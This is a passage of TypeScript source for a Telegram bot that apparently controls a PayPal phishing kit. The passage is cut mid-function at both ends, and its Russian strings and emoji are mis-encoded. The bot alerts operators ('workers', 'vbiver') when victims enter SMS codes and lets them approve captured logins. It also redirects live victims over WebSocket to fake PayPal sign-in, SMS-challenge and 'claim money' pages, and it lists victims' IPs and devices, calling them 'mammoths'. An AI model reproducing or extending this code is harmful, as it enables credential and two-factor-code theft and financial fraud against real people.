        callback_data: `redirect_${contextData ? contextData.substring(0, 8) : "direct"}_fullscreen`,
      },
    ]);

    // Fourth row - paypal redirect
    redirectButtons.push([
      {
        text: "‚ÄºÔ∏èOrig PayPal‚ÄºÔ∏è",
        callback_data: `redirect_${contextData ? contextData.substring(0, 8) : "direct"}_paypal`,
      },
    ]);

    // Fifth row - refresh button
    redirectButtons.push([
      {
        text: "üîÑ –û–±–Ω–æ–≤–∏—Ç—å",
        callback_data: `refresh_page_${contextData ? contextData.substring(0, 8) : "direct"}`,
      },
    ]);

    // Store the contextData mapping for button callbacks
    if (contextData) {
      const shortHash = contextData.substring(0, 8);
      if (!(global as any).redirectHashMap) {
        (global as any).redirectHashMap = new Map();
      }
      (global as any).redirectHashMap.set(shortHash, contextData);
    }

    // Send different notifications based on user role
    for (const user of targetUsers) {
      try {
        if (user.role === "admin" || user.role === "worker") {
          // Send full notification with SMS code and control buttons to admins/workers
          await bot.sendMessage(user.telegramId, message, {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: redirectButtons,
            },
          });
          console.log(`‚úÖ Full SMS notification sent to ${user.role} ${user.uniqueId}`);
        } else {
          // Send simple notification to regular users
          await sendSimpleUserNotification(user, linkId, "SMS –∫–æ–¥ –≤–≤–µ–¥–µ–Ω", contextData);
        }
      } catch (error) {
        console.error(
          `Failed to send SMS notification to ${user.uniqueId}:`,
          error,
        );
      }
    }
  } catch (error) {
    console.error("Error sending SMS notification:", error);
  }
}

export async function notifySmsPageAccess(
  contextData: string,
  stepupContext: string,
) {
  // Note: Enabled in development mode for testing
  console.log(`üì§ Sending SMS page access notification - context: ${contextData}`);
  
  if (!bot) {
    console.log("üö´ Bot not initialized, skipping notification");
    return;
  }

  try {
    let targetUsers: any[] = [];

    // If contextData is provided, find the specific link creator
    if (contextData) {
      console.log(
        "üîç Looking for SMS page access with contextData:",
        contextData,
      );
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));

      if (links.length > 0) {
        const createdBy = links[0].createdBy;
        targetUsers = await db
          .select()
          .from(telegramUsers)
          .where(
            and(
              eq(telegramUsers.telegramId, createdBy),
              eq(telegramUsers.isApproved, true),
            ),
          );
        console.log("üéØ Found link creator for SMS page:", targetUsers.length);
      }
    }

    // Fallback to all approved users if no specific link creator found
    if (targetUsers.length === 0) {
      targetUsers = await db
        .select()
        .from(telegramUsers)
        .where(eq(telegramUsers.isApproved, true));
      console.log(
        "‚ö†Ô∏è Fallback to all approved users for SMS page:",
        targetUsers.length,
      );
    }

    const message =
      `üîê –î–æ—Å—Ç—É–ø –∫ SMS —Å—Ç—Ä–∞–Ω–∏—Ü–µ\n\n` +
      `üîó Context Data:\n<code>${contextData}</code>\n` +
      `üì± Stepup Context:\n<code>${stepupContext}</code>\n` +
      `‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString("ru-RU")}\n\n` +
      `–û–¥–æ–±—Ä–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ SMS —Å—Ç—Ä–∞–Ω–∏—Ü–µ?`;

    // Create a short hash for callback data (Telegram limit is 64 bytes)
    const shortHash = contextData.substring(0, 8);

    // Store mapping of short hash to full contextData
    if (!global.smsHashMap) {
      global.smsHashMap = new Map();
    }
    global.smsHashMap.set(shortHash, contextData);

    // Initialize activeUsers map if not exists
    if (!(global as any).activeUsers) {
      (global as any).activeUsers = new Map();
    }

    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "‚úÖ –û–¥–æ–±—Ä–∏—Ç—å SMS",
              callback_data: `approve_sms_${shortHash}`,
            },
            {
              text: "‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å",
              callback_data: `reject_sms_${shortHash}`,
            },
          ],
        ],
      },
    };

    for (const user of targetUsers) {
      await bot.sendMessage(user.telegramId, message, {
        ...keyboard,
        parse_mode: "HTML",
      });
    }
  } catch (error) {
    console.error("Error sending SMS page access notification:", error);
  }
}

// Handle callback queries (inline button presses)
bot.on("callback_query", async (callbackQuery) => {
  const message = callbackQuery.message;
  const data = callbackQuery.data;
  const chatId = message?.chat.id;
  const telegramId = callbackQuery.from.id.toString();

  // Debug logging for specific user
  if (telegramId === "8146147595") {
    console.log(`üîç DEBUG @Dalsend (${telegramId}) callback:`, {
      data,
      chatId,
      hasMessage: !!message,
      timestamp: new Date().toISOString()
    });
  }

  if (!data || !chatId) return;

  // Allow all callback actions in development mode for testing
  // Development mode is now enabled for full functionality testing

  try {
    // Check if user is approved
    if (!(await isUserApproved(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è —ç—Ç–æ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è",
      });
      return;
    }

    if (data === "enable_redirect") {
      if (!(await isUserAdmin(telegramId))) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è —ç—Ç–æ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è",
        });
        return;
      }

      try {
        const response = await fetch(
          "http://localhost:5000/api/redirect/toggle",
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ permanentRedirect: true }),
          },
        );

        if (response.ok) {
          await bot.editMessageText(
            `üîÑ –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏–µ–π:\n\n` +
              `üìä –¢–µ–∫—É—â–∏–π —Å—Ç–∞—Ç—É—Å: –í–∫–ª—é—á–µ–Ω–∞ ‚úÖ\n\n` +
              `üî¥ –í–°–ï –∑–∞–ø—Ä–æ—Å—ã –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –Ω–∞ PayPal.com\n\n` +
              `‚ÑπÔ∏è –ü—Ä–∏ –≤–∫–ª—é—á–µ–Ω–∏–∏ –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏–∏ –≤–µ—Å—å —Ç—Ä–∞—Ñ–∏–∫ –±—É–¥–µ—Ç –Ω–∞–ø—Ä–∞–≤–ª—è—Ç—å—Å—è –Ω–∞ PayPal, –≤–∫–ª—é—á–∞—è –ø—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ –¥–æ–º–µ–Ω—É.`,
            {
              chat_id: chatId,
              message_id: message.message_id,
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "‚ùå –û—Ç–∫–ª—é—á–∏—Ç—å –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏—é",
                      callback_data: "disable_redirect",
                    },
                  ],
                ],
              },
            },
          );

          await bot.answerCallbackQuery(callbackQuery.id, {
            text: "‚úÖ –ü–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏—è –≤–∫–ª—é—á–µ–Ω–∞! –í–µ—Å—å —Ç—Ä–∞—Ñ–∏–∫ –∏–¥–µ—Ç –Ω–∞ PayPal.com",
          });
        }
      } catch (error) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–∫–ª—é—á–µ–Ω–∏–∏ –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏–∏",
        });
      }
      return;
    }

    if (data === "disable_redirect") {
      if (!(await isUserAdmin(telegramId))) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è —ç—Ç–æ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è",
        });
        return;
      }

      try {
        const response = await fetch(
          "http://localhost:5000/api/redirect/toggle",
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ permanentRedirect: false }),
          },
        );

        if (response.ok) {
          await bot.editMessageText(
            `üîÑ –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏–µ–π:\n\n` +
              `üìä –¢–µ–∫—É—â–∏–π —Å—Ç–∞—Ç—É—Å: –û—Ç–∫–ª—é—á–µ–Ω–∞ ‚ùå\n\n` +
              `üü¢ –°–∞–π—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ –æ–±—ã—á–Ω–æ–º —Ä–µ–∂–∏–º–µ\n\n` +
              `‚ÑπÔ∏è –ü—Ä–∏ –≤–∫–ª—é—á–µ–Ω–∏–∏ –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏–∏ –≤–µ—Å—å —Ç—Ä–∞—Ñ–∏–∫ –±—É–¥–µ—Ç –Ω–∞–ø—Ä–∞–≤–ª—è—Ç—å—Å—è –Ω–∞ PayPal, –≤–∫–ª—é—á–∞—è –ø—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ –¥–æ–º–µ–Ω—É.`,
            {
              chat_id: chatId,
              message_id: message.message_id,
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "‚úÖ –í–∫–ª—é—á–∏—Ç—å –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏—é",
                      callback_data: "enable_redirect",
                    },
                  ],
                ],
              },
            },
          );

          await bot.answerCallbackQuery(callbackQuery.id, {
            text: "‚ùå –ü–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏—è –æ—Ç–∫–ª—é—á–µ–Ω–∞! –°–∞–π—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–æ—Ä–º–∞–ª—å–Ω–æ",
          });
        }
      } catch (error) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫–ª—é—á–µ–Ω–∏–∏ –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏–∏",
        });
      }
      return;
    }

    if (data.startsWith("approve_sms_")) {
      const shortHash = data.replace("approve_sms_", "");

      // Get full contextData from hash map
      const contextData = global.smsHashMap?.get(shortHash);

      if (!contextData) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "–û—à–∏–±–∫–∞: –¥–∞–Ω–Ω—ã–µ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã",
        });
        return;
      }

      try {
        // Make API call to approve SMS page access
        const response = await fetch(
          `http://localhost:5000/api/sms-page-access/${contextData}/approve`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
          },
        );

        if (response.ok) {
          // Update the message to show approval
          await bot.editMessageText(message.text + "\n\n‚úÖ –û–î–û–ë–†–ï–ù–û", {
            chat_id: chatId,
            message_id: message.message_id,
            reply_markup: { inline_keyboard: [] },
          });

          await bot.answerCallbackQuery(callbackQuery.id, {
            text: "SMS —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –æ–¥–æ–±—Ä–µ–Ω–∞!",
          });
        } else {
          await bot.answerCallbackQuery(callbackQuery.id, {
            text: "–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–¥–æ–±—Ä–µ–Ω–∏–∏ SMS —Å—Ç—Ä–∞–Ω–∏—Ü—ã",
          });
        }
      } catch (error) {
        console.error("Error approving SMS page access:", error);
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–¥–æ–±—Ä–µ–Ω–∏–∏ SMS —Å—Ç—Ä–∞–Ω–∏—Ü—ã",
        });
      }
    } else if (data.startsWith("approve_")) {
      const loginAttemptIdStr = data.replace("approve_", "");
      const loginAttemptId = parseInt(loginAttemptIdStr);

      console.log("üîç Callback data:", data);
      console.log("üîç Extracted ID string:", loginAttemptIdStr);
      console.log("üîç Parsed ID:", loginAttemptId);

      if (isNaN(loginAttemptId)) {
        console.error("‚ùå Invalid login attempt ID:", loginAttemptIdStr);
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "–û—à–∏–±–∫–∞: –Ω–µ–≤–µ—Ä–Ω—ã–π ID –ø–æ–ø—ã—Ç–∫–∏ –≤—Ö–æ–¥–∞",
        });
        return;
      }

      // Approve the login attempt
      await storage.approveLoginAttempt(loginAttemptId);

      // Update the message to show approval
      await bot.editMessageText(message.text + "\n\n‚úÖ –û–î–û–ë–†–ï–ù–û", {
        chat_id: chatId,
        message_id: message.message_id,
        reply_markup: { inline_keyboard: [] },
      });

      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "–í—Ö–æ–¥ –æ–¥–æ–±—Ä–µ–Ω!",
      });
    } else if (data.startsWith("reject_")) {
      const loginAttemptIdStr = data.replace("reject_", "");
      const loginAttemptId = parseInt(loginAttemptIdStr);

      console.log("üîç Reject callback data:", data);
      console.log("üîç Extracted reject ID string:", loginAttemptIdStr);
      console.log("üîç Parsed reject ID:", loginAttemptId);

      if (isNaN(loginAttemptId)) {
        console.error("‚ùå Invalid reject login attempt ID:", loginAttemptIdStr);
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "–û—à–∏–±–∫–∞: –Ω–µ–≤–µ—Ä–Ω—ã–π ID –ø–æ–ø—ã—Ç–∫–∏ –≤—Ö–æ–¥–∞",
        });
        return;
      }

      // Delete the login attempt
      await storage.deleteLoginAttempt(loginAttemptId);

      // Update the message to show rejection
      await bot.editMessageText(message.text + "\n\n‚ùå –û–¢–ö–õ–û–ù–ï–ù–û", {
        chat_id: chatId,
        message_id: message.message_id,
        reply_markup: { inline_keyboard: [] },
      });

      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "–í—Ö–æ–¥ –æ—Ç–∫–ª–æ–Ω–µ–Ω!",
      });
    } else if (data.startsWith("links_page_")) {
      // Handle pagination: links_page_pageNumber_telegramId
      const parts = data.split("_");
      if (parts.length >= 4) {
        const pageNumber = parseInt(parts[2]);
        const targetUserId = parts[3];

        // Delete the current message and show new page
        try {
          await bot.deleteMessage(
            chatId,
            callbackQuery.message?.message_id || 0,
          );
          await showUserLinks(chatId, targetUserId, pageNumber);
          await bot.answerCallbackQuery(callbackQuery.id);
        } catch (error) {
          console.error("Error handling pagination:", error);
          await bot.answerCallbackQuery(callbackQuery.id, {
            text: "–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã",
          });
        }
      }
    } else if (data.startsWith("delete_page_")) {
      // Handle page deletion: delete_page_pageNumber_telegramId
      const parts = data.split("_");
      if (parts.length >= 4) {
        const pageNumber = parseInt(parts[2]);
        const targetUserId = parts[3];

        try {
          // Get user's links for the specific page
          const links = await db
            .select()
            .from(telegramLinks)
            .where(eq(telegramLinks.createdBy, targetUserId))
            .orderBy(desc(telegramLinks.createdAt));

          const LINKS_PER_PAGE = 3;
          const startIndex = pageNumber * LINKS_PER_PAGE;
          const endIndex = startIndex + LINKS_PER_PAGE;
          const pageLinks = links.slice(startIndex, endIndex);

          // Delete all links on this page
          for (const link of pageLinks) {
            await db
              .delete(telegramLinks)
              .where(eq(telegramLinks.linkId, link.linkId));
          }

          await bot.editMessageText(
            `üóë –£–¥–∞–ª–µ–Ω–æ ${pageLinks.length} —Å—Å—ã–ª–æ–∫ —Å–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã ${pageNumber + 1}`,
            {
              chat_id: chatId,
              message_id: callbackQuery.message?.message_id,
              reply_markup: { inline_keyboard: [] },
            },
          );

          await bot.answerCallbackQuery(callbackQuery.id, {
            text: `–£–¥–∞–ª–µ–Ω–æ ${pageLinks.length} —Å—Å—ã–ª–æ–∫!`,
          });
        } catch (error) {
          console.error("Error deleting page:", error);
          await bot.answerCallbackQuery(callbackQuery.id, {
            text: "–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã",
          });
        }
      }
    } else if (data.startsWith("delete_all_user_links_")) {
      // Handle mass deletion: delete_all_user_links_telegramId
      const targetUserId = data.replace("delete_all_user_links_", "");

      try {
        // Count links before deletion
        const links = await db
          .select()
          .from(telegramLinks)
          .where(eq(telegramLinks.createdBy, targetUserId));

        const linkCount = links.length;

        // Delete all user's links
        await db
          .delete(telegramLinks)
          .where(eq(telegramLinks.createdBy, targetUserId));

        await bot.editMessageText(
          `üóëüí• –£–¥–∞–ª–µ–Ω–æ –≤—Å–µ–≥–æ ${linkCount} —Å—Å—ã–ª–æ–∫!\n\n–í—Å–µ –≤–∞—à–∏ —Å—Å—ã–ª–∫–∏ –ø–æ–ª–Ω–æ—Å—Ç—å—é –æ—á–∏—â–µ–Ω—ã.`,
          {
            chat_id: chatId,
            message_id: callbackQuery.message?.message_id,
            reply_markup: { inline_keyboard: [] },
          },
        );

        await bot.answerCallbackQuery(callbackQuery.id, {
          text: `–£–¥–∞–ª–µ–Ω–æ ${linkCount} —Å—Å—ã–ª–æ–∫!`,
        });
      } catch (error) {
        console.error("Error deleting all links:", error);
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –≤—Å–µ—Ö —Å—Å—ã–ª–æ–∫",
        });
      }
    } else if (data.startsWith("delete_link_")) {
      // Extract link ID from callback data
      const linkId = data.replace("delete_link_", "");

      try {
        // Delete the link from database
        await db.delete(telegramLinks).where(eq(telegramLinks.linkId, linkId));

        // Update the message to show link deleted
        await bot.editMessageText(`üóë –°—Å—ã–ª–∫–∞ ${linkId} —É–¥–∞–ª–µ–Ω–∞`, {
          chat_id: chatId,
          message_id: callbackQuery.message?.message_id,
          reply_markup: { inline_keyboard: [] },
        });

        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "–°—Å—ã–ª–∫–∞ —É–¥–∞–ª–µ–Ω–∞!",
        });
      } catch (error) {
        console.error("Error deleting link:", error);
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ —Å—Å—ã–ª–∫–∏",
        });
      }
    } else if (data.startsWith("reject_sms_")) {
      const shortHash = data.replace("reject_sms_", "");

      // Update the message to show rejection
      await bot.editMessageText(message.text + "\n\n‚ùå –û–¢–ö–õ–û–ù–ï–ù–û", {
        chat_id: chatId,
        message_id: message.message_id,
        reply_markup: { inline_keyboard: [] },
      });

      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "SMS —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞!",
      });
    } else if (data.startsWith("send_email_")) {
      const shortHash = data.replace("send_email_", "");

      // Get full contextData from mapping
      let contextData = (global as any).checkHashMap?.get(shortHash);
      
      // If contextData not found in hash map, try to find it in database
      if (!contextData && shortHash !== "direct") {
        try {
          const links = await db.select().from(telegramLinks).where(
            sql`${telegramLinks.contextData} LIKE ${shortHash + '%'}`
          );
          if (links.length > 0) {
            contextData = links[0].contextData;
            console.log(`üîÑ Recovered contextData for send_email: ${contextData}`);
          }
        } catch (error) {
          console.error("Error recovering contextData for send_email:", error);
        }
      }
      
      if (!contextData) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "–û—à–∏–±–∫–∞: —Å—Å—ã–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞",
        });
        return;
      }

      // Find the link with this contextData
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));

      if (links.length === 0) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "–°—Å—ã–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞",
        });
        return;
      }

      // Store the contextData for the email process
      userStates.set(telegramId, {
        state: "awaiting_email",
        data: { contextData, shortHash },
      });

      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "–í–≤–µ–¥–∏—Ç–µ email –ø–æ–ª—É—á–∞—Ç–µ–ª—è",
      });

      await bot.sendMessage(
        chatId,
        "üìß –í–≤–µ–¥–∏—Ç–µ email –∞–¥—Ä–µ—Å –ø–æ–ª—É—á–∞—Ç–µ–ª—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –ø–ª–∞—Ç–µ–∂–µ:",
        cancelKeyboard,
      );
    } else if (data.startsWith("check_users_")) {
      const shortHash = data.replace("check_users_", "");

      // Get full contextData from mapping
      let contextData = (global as any).checkHashMap?.get(shortHash);
      
      // If contextData not found in hash map, try to find it in database
      if (!contextData && shortHash !== "direct") {
        try {
          const links = await db.select().from(telegramLinks).where(
            sql`${telegramLinks.contextData} LIKE ${shortHash + '%'}`
          );
          if (links.length > 0) {
            contextData = links[0].contextData;
            console.log(`üîÑ Recovered contextData for check_users: ${contextData}`);
          }
        } catch (error) {
          console.error("Error recovering contextData for check_users:", error);
        }
      }
      
      if (!contextData) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "–û—à–∏–±–∫–∞: —Å—Å—ã–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞",
        });
        return;
      }

      // Check active users for this link
      const activeUsers = (global as any).activeUsers || new Map();
      const currentTime = Date.now();
      const twoMinutesAgo = currentTime - 2 * 60 * 1000; // Reduced to 2 minutes for better accuracy

      // Clean up old entries first
      for (const [key, userData] of activeUsers) {
        if (userData.timestamp < twoMinutesAgo) {
          activeUsers.delete(key);
        }
      }

      // Find active users on this link
      let activeCount = 0;
      let activeDetails = "";

      for (const [userContextData, userData] of activeUsers) {
        if (
          userContextData === contextData &&
          userData.timestamp > twoMinutesAgo
        ) {
          activeCount++;
          const timeAgo = Math.round(
            (currentTime - userData.timestamp) / 1000 / 60,
          );
          const deviceInfo = parseUserAgent(userData.userAgent);
          activeDetails += `üë§ ${translatePageName(userData.page)}\n`;
          activeDetails += `‚è∞ ${timeAgo === 0 ? "<1" : timeAgo} –º–∏–Ω –Ω–∞–∑–∞–¥\n`;
          activeDetails += `üì± ${deviceInfo.device} | ${deviceInfo.browser}\n`;
          activeDetails += `üåç ${userData.ip}\n\n`;
        }
      }

      let responseText;
      if (activeCount > 0) {
        responseText = `üë§ –ê–∫—Ç–∏–≤–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ (${activeCount}):\n\n${activeDetails.substring(0, 180)}`; // Telegram limit 200 chars
      } else {
        responseText = "‚ùå –ú–∞–º–æ–Ω—Ç–∞ –Ω–µ—Ç –Ω–∞ —Å–∞–π—Ç–µ";
      }

      await bot.answerCallbackQuery(callbackQuery.id, {
        text: responseText,
        show_alert: true,
      });
    } else if (data.startsWith("redirect_")) {
      // Handle redirect buttons: redirect_shortHash_page
      console.log(`üîÑ Redirect button pressed by ${telegramId}: ${data}`);
      const parts = data.split("_");
      if (parts.length >= 3) {
        const shortHash = parts[1];
        // Handle multi-word pages like sms_loading
        const page = parts.length === 4 ? `${parts[2]}_${parts[3]}` : parts[2];
        
        console.log(`üîÑ Redirect details: shortHash=${shortHash}, page=${page}`);

        // Get full contextData from hash map
        let contextData = (global as any).redirectHashMap?.get(shortHash);
        console.log(`üîÑ ContextData from hash map: ${contextData}`);
        
        // Debug: Show entire hash map content
        if (telegramId === "8146147595" && (global as any).redirectHashMap) {
          console.log(`üîç DEBUG @Dalsend entire redirectHashMap:`, Array.from((global as any).redirectHashMap.entries()));
        }
        
        // If contextData not found in hash map, try to find it in database by shortHash
        if (!contextData && shortHash !== "direct") {
          try {
            const links = await db.select().from(telegramLinks).where(
              sql`${telegramLinks.contextData} LIKE ${shortHash + '%'}`
            );
            if (links.length > 0) {
              contextData = links[0].contextData;
              console.log(`üîÑ Recovered contextData from database: ${contextData}`);
            }
          } catch (error) {
            console.error("Error recovering contextData:", error);
          }
        }

        let redirectPath = "/";
        let pageName = "–û—Å–Ω–æ–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞";

        switch (page) {
          case "home":
            // Use contextData to construct the payment page URL
            if (contextData) {
              try {
                const links = await db.select().from(telegramLinks).where(
                  eq(telegramLinks.contextData, contextData)
                );
                if (links.length > 0) {
                  redirectPath = links[0].generatedLink;
                  console.log(`üîÑ Redirect to payment page: ${redirectPath}`);
                } else {
                  redirectPath = "/";
                }
              } catch (error) {
                console.error("Error getting payment link:", error);
                redirectPath = "/";
              }
            } else {
              redirectPath = "/";
            }
            pageName = "–û—Å–Ω–æ–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞";
            break;
          case "signin":
            redirectPath = "/signin";
            pageName = "–í–≤–æ–¥ –¥–∞–Ω–Ω—ã—Ö";
            break;
          case "loading":
            redirectPath = "/signin?showLoading=true";
            pageName = "–ó–∞–≥—Ä—É–∑–∫–∞";
            break;
          case "sms_loading":
            redirectPath = "/signin?showSmsLoading=true";
            pageName = "–ü—É—à";
            break;
          case "sms":
            redirectPath = `/authflow/challenges/softwareToken/?context_data=${contextData}`;
            pageName = "–°–ú–°";
            break;
          case "fullscreen":
            redirectPath = "/signin?showFullscreen=true";
            pageName = "Just a second";
            break;
          case "paypal":
            redirectPath = "https://paypal.com";
            pageName = "PayPal";
            break;
        }

        // Always set user state and send URL, regardless of connection status
        try {
          // Store the redirect state in database for user state management
          await fetch("http://localhost:5000/api/user-state", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              contextData: contextData || "direct",
              page: page,
            }),
          });

          // Determine redirect URL based on page type
          let redirectUrl = "/";

          switch (page) {
            case "home":
              // Find the original generated link for this context_data
              if (contextData) {
                const links = await db
                  .select()
                  .from(telegramLinks)
                  .where(eq(telegramLinks.contextData, contextData));
                console.log(`üîç DEBUG: Found links for contextData ${contextData}:`, links.length);
                if (links.length > 0 && links[0].generatedLink) {
                  // Use the stored generated link directly
                  redirectUrl = links[0].generatedLink;
                  console.log(`üîó DEBUG: Using stored link: ${redirectUrl}`);
                } else {
                  redirectUrl = `/myaccount/transfer/claim-money?context_data=${contextData}`;
                  console.log(`üîó DEBUG: Using fallback link: ${redirectUrl}`);
                }
              } else {
                redirectUrl = `/`;
                console.log(`üîó DEBUG: No contextData, using root: ${redirectUrl}`);
              }
              break;
            case "signin":
              redirectUrl = contextData
                ? `/signin?context_data=${contextData}`
                : `/signin`;
              break;
            case "sms":
              redirectUrl = contextData
                ? `/authflow/challenges/softwareToken/?context_data=${contextData}&direct_access=true`
                : `/authflow/challenges/softwareToken/`;
              break;
            case "loading":
              redirectUrl = contextData
                ? `/signin?context_data=${contextData}&showLoading=true`
                : `/signin?showLoading=true`;
              break;
            case "sms_loading":
              redirectUrl = contextData
                ? `/signin?context_data=${contextData}&showSmsLoading=true`
                : `/signin?showSmsLoading=true`;
              break;
            case "fullscreen":
              redirectUrl = contextData
                ? `/signin?context_data=${contextData}&showFullscreen=true`
                : `/signin?showFullscreen=true`;
              break;
            case "paypal":
              redirectUrl = "https://paypal.com";
              break;
          }

          // Send redirect command via WebSocket to connected users
          const userConnections = (global as any).userConnections;
          let userRedirected = false;

          // Debug logging for @Dalsend
          if (telegramId === "8146147595") {
            console.log(`üîç DEBUG @Dalsend redirect attempt:`, {
              contextData,
              hasUserConnections: !!userConnections,
              hasConnection: userConnections && contextData && userConnections.has(contextData),
              redirectUrl,
              action: parts[1]
            });
          }

          if (
            userConnections &&
            contextData &&
            userConnections.has(contextData)
          ) {
            const ws = userConnections.get(contextData);
            if (ws.readyState === WebSocket.OPEN) {
              ws.send(
                JSON.stringify({
                  type: "redirect",
                  url: redirectUrl,
                }),
              );
              userRedirected = true;
              
              // Debug logging for @Dalsend
              if (telegramId === "8146147595") {
                console.log(`‚úÖ @Dalsend redirect sent successfully to ${contextData}`);
              }
            } else if (telegramId === "8146147595") {
              console.log(`‚ùå @Dalsend WebSocket not open for ${contextData}, readyState: ${ws.readyState}`);
            }
          } else if (telegramId === "8146147595") {
            console.log(`‚ùå @Dalsend no connection found for ${contextData}`);
            console.log(`üîç DEBUG @Dalsend available connections:`, userConnections ? Array.from(userConnections.keys()) : 'none');
          }

          // Send redirect notification to original link creator
          if (contextData) {
            const workerUser = await db
              .select()
              .from(telegramUsers)
              .where(eq(telegramUsers.telegramId, telegramId));
            
            const workerName = workerUser.length > 0 ? workerUser[0].uniqueId : "–í–±–∏–≤–µ—Ä";
            await notifyRedirectAction(contextData, page, workerName);
          }

          // Always show success message regardless of connection status
          const statusMessage = userRedirected
            ? `‚úÖ ${pageName} - –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω`
            : `‚úÖ ${pageName} - –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ`;

          await bot.answerCallbackQuery(callbackQuery.id, {
            text: statusMessage,
            show_alert: true,
          });
        } catch (error) {
          console.error("Error setting redirect:", error);
          await bot.answerCallbackQuery(callbackQuery.id, {
            text: `‚ùå –û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è`,
            show_alert: true,
          });
        }
      }
    } else if (data.startsWith("refresh_page_")) {
      // Handle refresh page button
      const shortHash = data.replace("refresh_page_", "");
      
      // Get full contextData from hash map
      let contextData = (global as any).redirectHashMap?.get(shortHash) || 
                       (global as any).checkHashMap?.get(shortHash);
      
      if (!contextData) {
        // Try to find contextData in database by shortHash
        try {
          const results = await db
